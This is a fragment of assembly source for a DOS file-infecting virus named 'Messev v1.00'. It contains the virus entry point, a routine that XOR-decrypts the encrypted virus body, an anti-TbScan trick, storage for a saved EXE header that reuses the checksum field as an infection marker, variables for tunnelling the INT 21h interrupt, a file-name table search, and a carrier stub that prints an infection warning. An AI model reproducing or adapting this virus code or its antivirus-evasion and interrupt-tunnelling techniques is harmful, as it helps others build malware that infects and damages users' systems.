   ; Search a table & (re)set zeroflag depending on result. ZF when found.
   ;
   ; DS:SI = Line
   ; CS:DI = Table
   ;    CX = Number of names to compare.
   ;=======================================================================
   Search_Table:
           PUSH    AX
           PUSH    BX
           PUSH    SI
           PUSH    DI
           PUSH    BP
           PUSH    DS
           PUSH    ES

           PUSH    CX
           PUSH    DI
           PUSH    ES

           PUSH    DS
           POP     ES

           PUSH    SI
           POP     DI

           MOV     AL, '.'

           CLD
           MOV     CX, 127
           REPNZ   SCASB

           MOV     AL, '\'
           STD
           MOV     CX, 127
           REPNZ   SCASB

           MOV     BP, ES:[DI+2]
           MOV     BX, ES:[DI+4]
           MOV     DX, ES:[DI+6]
           MOV     AL, ES:[DI+8]

           POP     ES
           POP     DI
           POP     CX


   Find_Match:
           CMP     CS:[DI+0], BP
           JNE     Not_Found

           CMP     CS:[DI+2], BX
           JNE     Not_Found

           CMP     CS:[DI+4], DX
           JNE     Not_Found

           CMP     CS:[DI+6], AL
           JNE     Not_Found


   Comple:         CMP     AX, AX
           JMP     Exit_Sea

   Not_Found:
           ADD     DI, 7
           LOOP    Find_Match

           XOR     AX, AX
           NOT     AL
           CMP     AL, AH

   Exit_Sea:
           POP     ES
           POP     DS
           POP     BP
           POP     DI
           POP     SI
           POP     BX
           POP     AX

           RETN


   ; Is the handle in BX corresponding to a file or a device? (sets ZF).
   Check_Handle:
           MOV     AX, 4400h               ; IOCTL
           CALL    DosInt

           TEST    DL, 80h                 ; Filehandle?

           RETN


   Port_Driver     DB      'C:\WINDOWS\SYSTEM\IOSUBSYS\HDFLOP.PDR', 0
   Parameters      DB      ' NM CO', 0Dh


   End_Encrypted_File:

   NOP_Msg         DB      '$'

               ; === VIRUS ENTRYPOINT ===
   START:
           PUSHF                           ; Save registers.
           PUSH    AX                      ; (Same as Push_All).
           PUSH    BX
           PUSH    CX
           PUSH    DX
           PUSH    SI
           PUSH    DI
           PUSH    DS
           PUSH    ES
           PUSH    BP

           ;IN      AL, 21h                 ; Take-out keyboard.
           ;OR      AL, 02h
           ;OUT     21h, AL

           PUSH    CS
           POP     DS

           XOR     BX, BX
           MOV     CX, OFFSET End_Encrypted_File

   Decrypt_Byte:   XOR     BYTE PTR [BX], 0        ; Decrypt our body.
           ORG     $-1
   File_Key        DB      0
           INC     BX

           MOV     AH, 09h                 ; Prints a empty string.
           MOV     DX, OFFSET NOP_Msg      ; (Anti-TbScan).
           INT     21h

           LOOP    Decrypt_Byte

           JMP     Entry
   Virus_End:

   Header:

   Mark            DW      0       ; .EXE-identifier (always 'MZ').
   Mod512          DW      0
   Byte_Pages      DW      0
   Num_Reloc       DW      0
   HeaderSize      DW      0
   MinMem          DW      0
   MaxMem          DW      0
   Init_SS         DW      0
   Init_SP         DW      0
   Checksum        DW      0       ; Checksum, unused by MS-DOS, used by us.
   Init_IP         DW      0
   Init_CS         DW      0


           ; === TEMP VARIABLES ===

   Status          DB      0
   Init_Status     DB      0

   Int01h          DW      0, 0
   Int21h          DW      0, 0    ; Tunnelled INT 21h.
   Int24h          DW      0, 0
   New_Pos         DW      0, 0
   Old_Pos         DW      0, 0
   File_Pos        DW      0, 0
   Read_Bytes      DW      0
   Padding         DW      0
   Dos_Segment     DW      0       ; 1st Memory Control Block.
   Trace_Mode      DB      0       ; Are we tracing BIOS or DOS-interrupt?
   Ret_Add         DW      0
   Tunnel_Int      DW      0, 0    ; Address of the tunneled interrupt.
   Read_Buffer     DW      0, 0
   FileTime        DW      0
   FileDate        DW      0
   Temp            DB      0

   Buffer:


   Carrier:
           PUSH    CS
           POP     DS

           MOV     AH, 09h                 ; Display warning.
           MOV     DX, OFFSET Warning_Msg
           INT     21h

           MOV     AX, 4C00h               ; Exit to DOS.
           INT     21h

   Warning_Msg     DB      'WARNING: This program is infected with the '
           DB      'Messev v1.00 virus!', 0Ah, 0Dh, '$'

           END     START
